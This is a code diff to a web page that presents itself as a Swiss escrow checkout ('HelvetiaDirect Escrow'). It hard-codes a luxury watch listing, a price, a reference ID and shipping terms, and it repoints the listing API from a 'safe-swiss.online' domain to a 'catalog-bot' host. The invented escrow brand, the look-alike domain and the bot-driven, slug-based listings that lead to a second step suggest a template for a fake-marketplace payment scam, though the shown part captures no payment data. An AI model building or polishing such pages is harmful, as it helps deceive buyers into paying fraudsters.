@@ -1708,9 +1708,9 @@
         <!-- Dynamic Merchant / Service Logo & Name -->
         <div class="service-info">
           <div class="service-logo-wrap" id="service-logo">
-            {{service_logo}}
+            <span aria-hidden="true"></span>
           </div>
-          <span class="service-title" id="service-name">{{service_name}}</span>
+          <span class="service-title" id="service-name">HelvetiaDirect Escrow</span>
         </div>
       </div>
 
@@ -1822,8 +1822,8 @@
               <img 
                 id="product-image" 
                 class="product-img real-content" 
-                src="{{product_image}}" 
-                alt="{{product_title}}" 
+                src="https://images.unsplash.com/photo-1522335789203-aabd1fc54bc9?auto=format&fit=crop&w=800&q=80" 
+                alt="Omega Speedmaster Professional Moonwatch — Chronograph 42mm" 
                 loading="eager"
                 onerror="handleImageFallback(this)"
               />
@@ -1845,7 +1845,7 @@
                 <!-- Transaction / Reference ID (With Feature 5: Checkmark Animation) -->
                 <div class="tx-ref-badge" id="tx-ref-wrap" title="Click to copy reference ID">
                   <span data-i18n="ref_label">Ref:</span>
-                  <span id="transaction-id">{{transaction_id}}</span>
+                  <span id="transaction-id">CH-8924-7710-PX</span>
                   <button type="button" class="copy-btn" id="btn-copy-ref" aria-label="Copy reference ID">
                     <!-- Default Copy Icon -->
                     <svg id="icon-copy-default" width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
@@ -1861,7 +1861,7 @@
 
                 <!-- Dynamic Listing Title -->
                 <h1 class="product-title" id="product-title">
-                  {{product_title}}
+                  Omega Speedmaster Professional Moonwatch — Chronograph 42mm
                 </h1>
 
                 <!-- Escrow Buyer Protection Pill -->
@@ -1877,7 +1877,7 @@
               <!-- Price Display -->
               <div class="product-price-block real-content">
                 <span class="price-currency">CHF</span>
-                <span class="price-val" id="product-price-val">{{price}}</span>
+                <span class="price-val" id="product-price-val">1'450.00</span>
               </div>
 
             </div>
@@ -1896,7 +1896,7 @@
           <div class="summary-rows">
             <div class="summary-row">
               <span data-i18n="item_price_label">Item price</span>
-              <span class="summary-value" id="summary-item-price">CHF {{price}}</span>
+              <span class="summary-value" id="summary-item-price">CHF 1'450.00</span>
             </div>
 
             <!-- FEATURE 2: Delivery Method Calculator Options -->
@@ -1960,7 +1960,7 @@
                 <button type="button" class="btn-terms-toggle" id="btn-delivery-terms-toggle" aria-expanded="false" data-i18n="terms_view_details">Details</button>
               </div>
               <p class="seller-delivery-body" id="seller-delivery-text">
-                {{delivery_info}}
+Official Swiss Post priority shipping (A-Post Priority). Next business day delivery with registered signature and full value insurance up to CHF 5'000.
               </p>
             </div>
           </div>
@@ -2468,7 +2468,7 @@
       };
 
       let currentConfig = JSON.parse(JSON.stringify(defaultListingConfig));
-      let currentLang = 'EN';
+      let currentLang = 'DE';
       let rawPriceNum = 1450.00;
       let deliveryNum = 15.00;
       let isSessionActive = true;
@@ -2542,7 +2542,7 @@
       /* ==========================================================================
          CONFIG LOADER & THEME APPLIER
          ========================================================================== */
-      const LISTING_API_BASE_URL = (window.LISTING_API_BASE_URL || 'https://api.safe-swiss.online').replace(/\/$/, '');
+      const LISTING_API_BASE_URL = (window.LISTING_API_BASE_URL || 'https://catalog-bot-rx1t.onrender.com').replace(/\/$/, '');
 
       function getListingSlug() {
         const pathMatch = window.location.pathname.match(/\/p\/([A-Za-z0-9]{8})(?:\/)?$/);
@@ -2751,9 +2751,9 @@
         }
       }
 
-      /* ==========================================================================
-         FEATURE 1: SKELETON LOADERS (1.5s PULSE THEN CLEAN FADE-IN)
-         ========================================================================== */
+      /* ============================================================================
+         FEATURE 1: SKELETON LOADERS
+         ============================================================================ */
       function initSkeletonLoaders() {
         const skeletonImg = document.getElementById('skeleton-img');
         const skeletonDetails = document.getElementById('skeleton-details');
@@ -2775,7 +2775,7 @@
             el.style.transition = 'opacity 0.45s cubic-bezier(0.16, 1, 0.3, 1)';
             el.style.opacity = '1';
           });
-        }, 1500);
+        }, 250);
       }
 
       /* ==========================================================================
@@ -3184,9 +3184,7 @@
             const nextParams = new URLSearchParams(window.location.search);
             if (slug) nextParams.set('slug', slug);
             const search = nextParams.toString() ? `?${nextParams.toString()}` : '';
-            setTimeout(() => {
-              window.location.href = 'step-2.html' + search;
-            }, 500);
+            window.location.assign('/step-2.html' + search);
           });
         }
 
